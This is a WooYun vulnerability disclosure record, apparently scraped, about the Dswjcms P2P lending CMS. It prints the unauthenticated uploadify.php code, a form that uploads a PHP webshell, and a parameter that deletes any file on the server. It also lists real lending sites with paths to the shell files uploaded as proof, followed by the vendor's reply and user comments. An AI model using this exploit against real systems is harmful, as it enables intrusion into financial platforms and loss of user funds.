{"id": 72022, "wybug_id": "wooyun-2015-0141209", "wybug_title": "某P2P网贷系统前台getshell与任意文件删除漏洞(可涉及大量资金安全)", "wybug_corp": "dswjcms.com", "wybug_author": "roker", "wybug_date": "2015-09-17 12:33", "wybug_open_date": "2015-12-16 19:54", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-16：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： Boom~ 详细说明：  /www/Public/uploadify/uploadify.php\n<?php/*uploadify 后台处理*///设置上传目录error_reporting( E_ALL & ~E_NOTICE & ~E_DEPRECATED );$path = \"uploads/\".$_GET['folder'].\"/\";\tif($_GET['file_delete']){\t//如果原先有图片就删除\t\tif(file_exists('.'.$_GET['file_delete'])){\t//存在图片\t\tunlink('.'.$_GET['file_delete']);\t//删除它\t}}if (!empty($_FILES)) {\t\t//得到上传的临时文件流\t$tempFile = $_FILES['Filedata']['tmp_name'];\t\t//允许的文件后缀\t$fileTypes = array('jpg','jpeg','gif','png'); \t\t//得到文件原名\t$fileParts = pathinfo($_FILES['Filedata']['name']);\t$ftype=$fileParts['extension'];\t$fileName=microtime(true).\".\".$fileParts['extension'];\t//以微秒时间命名\t\t//最后保存服务器地址\tif(!is_dir($path))\t   mkdir($path);\tif (move_uploaded_file($tempFile, $path.$fileName)){\t\techo $fileName;\t}else{\t\techo $fileName.$_FILES['Filedata']['tmp_name'].\"上传失败！\";\t}}?>\n没有权限设置 ，$fileTypes也没有看到调用。提交$_GET['file_delete'] 即可任意文件删除。本地构造表单 \n<form action=\"http://xxx/Public/uploadify/uploadify.php\" method=\"post\" enctype =\"multipart/form-data\" > <input id=\"File\" name=\"Filedata\" type=\"file\" /> <input type=\"submit\" name=\"Button1\" value=\"Button\" id=\"Button1\" /></form>\n即可getshell。   漏洞证明：  案例 1：http://www.pjzx123.com/\n\n13亿。。不知道真的假的。。拒绝查水表- -http://www.pjzx123.com/Public/uploadify/uploads/201509/1442254529.7142.php案例2：http://hm.bjdjyx.com/\n\n几百万。http://hm.bjdjyx.com//Public/uploadify/uploads/1442254710.5383.php案例3：http://www.yunzew.com/\n\n10多万。http://www.yunzew.com//Public/uploadify/uploads/1442254745.36.php4:http://www.aft-sunnyit.com//Public/uploadify/uploads/1442254784.43.php5:http://www.fangdaibao.cc/Public/uploadify/uploads/1442254831.3598.php   修复方案：  判断权限。检测后缀   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-09-17 19:52 厂商回复： 感谢您对Dswjcms的支持，以上几个站点都未购买过本公司的授权，请自行通知对应公司 最新状态： 2015-09-17：漏洞已修复感谢楼主对本开源系统的漏洞挖掘，我们在收到楼主的第一时间内已对反应的漏洞进行了修复，漏洞已通过Dswjcms官方论坛给予修复意见，并在下一版本对该漏洞进行修复；已购买授权的用户，我们将以邮件形式通知其自行修复，未购买授权的用户，请看到后去官方论坛查看修复方式后自行修复最后感谢乌云和作者为Dswjcms开源项目付出的贡献  ", "replys": "漏洞评价：\n评论\n     2015-09-17 20:07 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @Dswjcms  有病哦  都撸穿了 给1rank 还不如忽略呢。    \n     2015-09-17 20:16 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:372 漏洞数:109        )\t\t \n  心累。    \n     2015-09-17 21:14 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  1分啊。。。。侮辱。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}